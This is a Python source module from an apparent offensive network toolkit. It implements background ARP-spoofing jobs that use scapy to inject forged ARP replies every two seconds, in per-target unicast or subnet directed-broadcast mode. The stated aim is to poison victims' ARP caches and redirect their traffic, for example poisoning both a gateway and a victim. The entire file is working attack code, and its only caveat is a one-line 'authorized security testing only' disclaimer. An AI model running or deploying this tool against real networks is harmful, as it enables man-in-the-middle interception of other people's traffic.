"""ARP-reply forging ("spoof") jobs.

A layer-2 traffic-redirection automation: each ``spoof`` starts an independent
background job on one interface that continuously injects forged ARP replies
claiming a chosen IP is at a chosen MAC, so victim hosts poison their own ARP
caches and start sending traffic for that IP to the given MAC. Classic
traffic-redirection plumbing (cf. ``arpspoof`` from dsniff, ``ettercap``).

Two delivery styles are supported (the ``method`` argument; see
:data:`_METHODS`):

* ``reply``       - one forged ARP reply per target, unicast to the target's
                    MAC where known and broadcast otherwise. Good when the
                    victim is expected to have (or just have made) a matching
                    ARP request outstanding.
* ``gratuitous``  - one L2-broadcast frame per target subnet, with the ARP
                    ``pdst`` set to that subnet's directed broadcast address
                    (see :func:`_plan_sends`). Fewer packets per pass and
                    whole-segment reach; the subnets are computed from
                    ``--target`` by grouping its IPs into /24s.

Jobs are keyed by ``(interface, spoofed_ip)`` so a user may claim several
different IPs on the same interface at once (a typical redirection setup poisons
both the gateway and the victim from opposite sides). ``stop_all()`` ends every
running job at once, matching how such a setup is usually torn down; there is no
per-job ``stop`` command by design - use the top-level ``tasks`` view to see
what is running. Injection requires root; the CLI gates the actions. For
authorized security testing only.
"""

from __future__ import annotations

import ipaddress
import re
import threading
import time
from dataclasses import dataclass
from typing import TYPE_CHECKING

from scapy.layers.l2 import ARP, Ether

from mac_and_seize.core.errors import ModuleError
from mac_and_seize.net.adapters import scapy_io
from mac_and_seize.observability import get_logger

if TYPE_CHECKING:
    from mac_and_seize.core.context import AppContext

#: Seconds between poison sweeps (one forged reply per target per pass). Real
#: ARP caches refresh every few minutes on their own, and legitimate stacks may
#: send unsolicited gratuitous ARPs occasionally, so the job re-poisons steadily
#: to keep the forged binding the *most recent* one the cache has seen. 2s
#: matches classic tooling (``arpspoof``) - fast enough to win the race,
#: slow enough not to be a flood.
_SPOOF_INTERVAL_S = 2.0

#: How many consecutive failed sends end a job on its own (e.g. the interface
#: went down mid-run) instead of spinning forever logging.
_MAX_CONSECUTIVE_FAILURES = 20

#: MAC address format (six colon-separated hex bytes).
_MAC_RE = re.compile(r"^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$")

#: Ethernet broadcast, used as destination for gratuitous frames and as a
#: fallback when a reply-mode target's MAC is not (yet) known.
_BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"

#: Valid values for the ``method`` argument of :meth:`ArpSpoofService.spoof`.
#: ``reply``     - one forged ARP reply per target (unicast if the target MAC
#:                 is known, else broadcast); good when a victim recently sent
#:                 an ARP request that this frame can pretend to answer.
#: ``gratuitous`` - one L2-broadcast frame per target subnet, with ``pdst``
#:                 set to that subnet's directed broadcast address; fewer
#:                 frames per pass, whole-segment reach.
_METHODS = ("reply", "gratuitous")

#: Assumed prefix length when grouping loose target IPs (single addresses, last
#: -octet ranges, ``discovered``) into subnets for gratuitous mode. LANs are
#: overwhelmingly /24; users who need a different size can pass an explicit
#: CIDR (e.g. ``--target 10.0.0.0/16``) whose IPs still fall through this same
#: grouping, which yields the same broadcast for each /24 slice.
_GRATUITOUS_GROUP_PREFIX = 24


def _spoof_frame(
    spoofer_mac: str, spoofed_ip: str, dst_mac: str, pdst: str,
):
    """Build one forged ARP reply frame.

    The frame is always an ARP reply (``op=2``) claiming that ``spoofed_ip`` is
    at ``spoofer_mac``. The L2 destination is ``dst_mac`` (unicast or broadcast,
    chosen by the caller), and ``pdst`` is the ARP packet's target IP - a
    specific victim IP in ``reply`` mode, or a subnet's directed broadcast
    address in ``gratuitous`` mode. When broadcasting, ARP ``hwdst`` is set to
    all zeros per RFC 826; otherwise it equals the L2 destination.
    """
    # When broadcasting (dst_mac is ff:ff:ff:ff:ff:ff), ARP hwdst must be
    # all zeros for the receiving kernel to accept it as valid.
    arp_hwdst = "00:00:00:00:00:00" if dst_mac == _BROADCAST_MAC else dst_mac
    return Ether(src=spoofer_mac, dst=dst_mac) / ARP(
        op=2,  # reply
        hwsrc=spoofer_mac,
        psrc=spoofed_ip,
        hwdst=arp_hwdst,
        pdst=pdst,
    )


def _validate_ip(value: str, field: str) -> str:
    """Return a canonicalised IPv4 string or raise :class:`ValueError`."""
    text = (value or "").strip()
    if not text:
        raise ValueError(f"{field} is required.")
    try:
        return str(ipaddress.IPv4Address(text))
    except ValueError as exc:
        raise ValueError(f"Invalid {field} {value!r}: {exc}.") from exc


def _validate_mac(value: str, field: str) -> str:
    """Return a normalised (lower-case) MAC string or raise :class:`ValueError`."""
    text = (value or "").strip().lower()
    if not _MAC_RE.match(text):
        raise ValueError(
            f"Invalid {field} {value!r}; expected the form AA:BB:CC:DD:EE:FF."
        )
    return text


def _validate_method(value: str) -> str:
    """Return a normalised method or raise :class:`ValueError`."""
    text = (value or "").strip().lower()
    if text not in _METHODS:
        raise ValueError(
            f"Invalid method {value!r}; expected one of: "
            f"{', '.join(_METHODS)}."
        )
    return text


def _plan_sends(
    method: str, targets: list[tuple[str, str | None]],
) -> list[tuple[str, str]]:
    """Turn resolved ``targets`` into ``(dst_mac, arp_pdst)`` tuples to emit.

    In ``reply`` mode this is one frame per target - unicast to the target's
    known MAC if any, else broadcast. In ``gratuitous`` mode the targets are
    grouped by their containing /24 (see :data:`_GRATUITOUS_GROUP_PREFIX`) and
    one L2-broadcast frame is emitted per unique subnet with ``pdst`` set to
    that subnet's directed broadcast, so a single frame announces the binding
    to every host on that segment.
    """
    if method == "reply":
        return [(mac or _BROADCAST_MAC, ip) for ip, mac in targets]
    # gratuitous: group by /24 (or _GRATUITOUS_GROUP_PREFIX), dedup, and emit
    # one broadcast frame per unique subnet.
    subnets: dict[ipaddress.IPv4Network, ipaddress.IPv4Address] = {}
    for ip, _mac in targets:
        network = ipaddress.IPv4Network(
            f"{ip}/{_GRATUITOUS_GROUP_PREFIX}", strict=False,
        )
        subnets[network] = network.broadcast_address
    ordered = sorted(subnets.items())
    return [(_BROADCAST_MAC, str(bcast)) for _net, bcast in ordered]


def _is_ipv4(ip: str) -> bool:
    try:
        ipaddress.IPv4Address(ip)
        return True
    except ValueError:
        return False


def _resolve_targets(
    context: "AppContext", target: str,
) -> list[tuple[str, str | None]]:
    """Expand the ``--target`` argument into ``(ip, mac_or_none)`` tuples.

    Accepts a single IP, a CIDR (``192.168.1.0/24``), a last-octet range
    (``192.168.1.10-20``), or the keyword ``"discovered"`` - which pulls every
    host the discovery module has seen so far (including its MAC where known,
    so replies to those hosts can be unicast instead of broadcast). ARP is
    IPv4-only, so IPv6 entries in a ``"discovered"`` store are silently
    filtered out.
    """
    text = (target or "").strip()
    if not text:
        raise ValueError(
            "--target is required (an IP, range, CIDR, or 'discovered')."
        )
    if text.lower() == "discovered":
        try:
            discovery = context.service("discovery")
        except KeyError as exc:
            raise ModuleError(
                "The 'discovered' target needs the discovery module, which is "
                "not loaded."
            ) from exc
        # Use the peer service's public row API so we don't reach into its
        # internal store. ``ip`` carries a '*' prefix for hosts new to the last
        # scan; ``mac`` is '-' when unknown.
        rows = discovery.list_rows()
        hosts: list[tuple[str, str | None]] = []
        for row in rows:
            ip = str(row.get("ip", "")).lstrip("*").strip()
            if not ip or not _is_ipv4(ip):
                continue
            mac_field = str(row.get("mac", "") or "").strip()
            mac = mac_field if mac_field and mac_field != "-" else None
            hosts.append((ip, mac))
        if not hosts:
            raise ModuleError(
                "No discovered hosts to target; run 'discovery scan' with an "
                "explicit target first before using 'discovered'."
            )
        return hosts
    try:
        ips = scapy_io.expand_hosts(text)
    except ValueError as exc:
        raise ValueError(f"Invalid --target {text!r}: {exc}.") from exc
    ipv4 = [ip for ip in ips if _is_ipv4(ip)]
    if not ipv4:
        raise ValueError(
            f"--target {text!r} expands to no IPv4 addresses (ARP is IPv4-only)."
        )
    return [(ip, None) for ip in ipv4]


@dataclass
class ArpSpoofJob:
    """One running ARP-spoof job (one interface + one claimed IP)."""

    iface: str
    spoofed_ip: str
    spoofer_mac: str
    #: Delivery style, one of :data:`_METHODS`. Kept for status messages; the
    #: worker itself just iterates ``sends``.
    method: str
    #: Precomputed ``(dst_mac, arp_pdst)`` tuples emitted every
    #: :data:`_SPOOF_INTERVAL_S` (see :func:`_plan_sends`).
    sends: list[tuple[str, str]]
    stop_event: threading.Event
    started_at: float
    thread: threading.Thread | None = None
    task: object | None = None
    sent: int = 0

    @property
    def key(self) -> tuple[str, str]:
        return (self.iface, self.spoofed_ip)


class ArpSpoofService:
    """Session-scoped registry of ARP-spoof jobs (one per iface + claimed IP)."""

    def __init__(self) -> None:
        self._log = get_logger(__name__)
        self._lock = threading.RLock()
        self._jobs: dict[tuple[str, str], ArpSpoofJob] = {}
        self._context: "AppContext | None" = None

    # --- Public API -----------------------------------------------------------

    def spoof(
        self,
        context: "AppContext",
        interface: str,
        ip: str,
        mac: str,
        method: str,
        *,
        target: str | None,
    ) -> str:
        """Start a background ARP spoof (raises if the same job is already up).

        ``interface`` sends the frames; ``ip`` is the address being claimed
        (the "is at" address); ``mac`` is the MAC being claimed for it;
        ``method`` picks the delivery style (see :data:`_METHODS`); and
        ``target`` selects whom to poison (see :func:`_resolve_targets` for the
        accepted forms - ``target`` is required for both methods, and in
        ``gratuitous`` mode it also drives the subnet-broadcast computation).
        Returns immediately - the job runs in the background and the prompt
        stays usable.
        """
        iface = (interface or "").strip()
        if not iface:
            raise ValueError("Give an interface to send frames from.")
        spoofed_ip = _validate_ip(ip, "IP")
        spoofer_mac = _validate_mac(mac, "MAC")
        method = _validate_method(method)

        available = scapy_io.available_interfaces()
        if iface not in available:
            raise ValueError(
                f"Unknown interface {iface!r}. "
                f"Available: {', '.join(available) or 'none'}."
            )

        targets = _resolve_targets(context, target or "")
        sends = _plan_sends(method, targets)
        if not sends:
            # Only reachable via a bug in _plan_sends; _resolve_targets already
            # rejects an empty target list.
            raise ValueError(
                f"--target {target!r} produced no frames to send."
            )

        key = (iface, spoofed_ip)
        with self._lock:
            self._reap_locked()
            if key in self._jobs:
                raise ModuleError(
                    f"An ARP spoof is already running for {spoofed_ip} on "
                    f"{iface!r}; stop it first."
                )
            self._context = context
            job = ArpSpoofJob(
                iface=iface,
                spoofed_ip=spoofed_ip,
                spoofer_mac=spoofer_mac,
                method=method,
                sends=sends,
                stop_event=threading.Event(),
                started_at=time.monotonic(),
            )
            job.thread = threading.Thread(
                target=self._run,
                args=(job,),
                name=f"lan-arp-spoof-{method}-{iface}-{spoofed_ip}",
                daemon=True,
            )
            job.task = context.tasks.start(
                context.current_command,
                stop=lambda k=key: self._stop_key(k),
            )
            self._jobs[key] = job
            job.thread.start()

        if method == "reply":
            return (
                f"ARP spoof started on {iface} (reply): telling {len(sends)} "
                f"target(s) that {spoofed_ip} is at {spoofer_mac}. "
                f"Stop every running spoof with 'lan arp stop'."
            )
        return (
            f"ARP spoof started on {iface} (gratuitous): announcing "
            f"{spoofed_ip} is at {spoofer_mac} to {len(sends)} subnet(s) "
            f"via directed broadcast. "
            f"Stop every running spoof with 'lan arp stop'."
        )

    def stop_all(self) -> str:
        """Stop every running ARP-spoof job (raises if none are running)."""
        with self._lock:
            self._reap_locked()
            jobs = list(self._jobs.values())
        if not jobs:
            raise ModuleError("No ARP spoof jobs are running.")
        for job in jobs:  # signal them all first so they wind down together
            job.stop_event.set()
        total = 0
        for job in jobs:
            self._join_job(job)
            total += job.sent
        labels = ", ".join(
            f"{j.spoofed_ip}@{j.iface}/{j.method}" for j in jobs
        )
        return (
            f"Stopped {len(jobs)} ARP spoof job(s): {labels} "
            f"({total} reply frame(s) sent total)."
        )

    # --- Worker ---------------------------------------------------------------

    def _run(self, job: ArpSpoofJob) -> None:
        """Injection loop for one job; always finalizes on exit."""
        failures = 0
        error = False
        try:
            while not job.stop_event.is_set():
                for dst_mac, pdst in job.sends:
                    if job.stop_event.is_set():
                        break
                    frame = _spoof_frame(
                        job.spoofer_mac, job.spoofed_ip, dst_mac, pdst,
                    )
                    try:
                        scapy_io.send_l2(frame, job.iface)
                        job.sent += 1
                        failures = 0
                    except OSError as exc:
                        # Injection can fail transiently (device busy) or hard
                        # (the interface vanished). Debug, not warning - the
                        # loop runs periodically and must not flood the prompt.
                        failures += 1
                        self._log.debug(
                            "ARP spoof: send on %s failed: %s", job.iface, exc,
                        )
                        if failures >= _MAX_CONSECUTIVE_FAILURES:
                            self._log.warning(
                                "ARP spoof for %s on %s gave up: %d "
                                "consecutive send failures.",
                                job.spoofed_ip, job.iface, failures,
                            )
                            error = True
                            break
                if error:
                    break
                job.stop_event.wait(_SPOOF_INTERVAL_S)
        except Exception:  # noqa: BLE001 - a crashed worker must still finalize
            self._log.exception(
                "ARP spoof worker for %s on %s crashed",
                job.spoofed_ip, job.iface,
            )
            error = True
        finally:
            self._finalize(job, error=error)

    def _finalize(self, job: ArpSpoofJob, *, error: bool) -> None:
        """Drop ``job`` from the registry and report a self-end via notify."""
        with self._lock:
            if self._jobs.get(job.key) is job:
                del self._jobs[job.key]

        context = self._context
        if job.task is not None and context is not None:
            context.tasks.finish(job.task)

        # A user-driven stop (stop_event set by stop_all()) is reported by that
        # command; stay quiet to avoid a duplicate line. A job that ended on
        # its own (repeated send failures / crash) happened while the user is
        # elsewhere, so surface it via the prompt-safe notify channel.
        if job.stop_event.is_set() or context is None:
            return
        if error:
            context.presenter.notify(
                f"ARP spoof for {job.spoofed_ip} on {job.iface} stopped: "
                f"injection kept failing ({job.sent} frame(s) sent)."
            )

    # --- Internals ------------------------------------------------------------

    def _stop_key(self, key: tuple[str, str]) -> None:
        """Stop the job identified by ``key`` (used as a task-registry stop hook)."""
        with self._lock:
            self._reap_locked()
            job = self._jobs.get(key)
        if job is None:
            return
        self._join_job(job)

    def _reap_locked(self) -> None:
        """Drop jobs whose worker already exited (defensive: workers self-remove)."""
        dead = [
            key
            for key, job in self._jobs.items()
            if job.thread is not None and not job.thread.is_alive()
        ]
        for key in dead:
            self._jobs.pop(key, None)

    def _join_job(self, job: ArpSpoofJob) -> None:
        """Signal ``job`` and wait for its worker (which finalizes) to finish."""
        job.stop_event.set()
        thread = job.thread
        if (
            thread is not None
            and thread.is_alive()
            and thread is not threading.current_thread()
        ):
            thread.join(timeout=3.0)
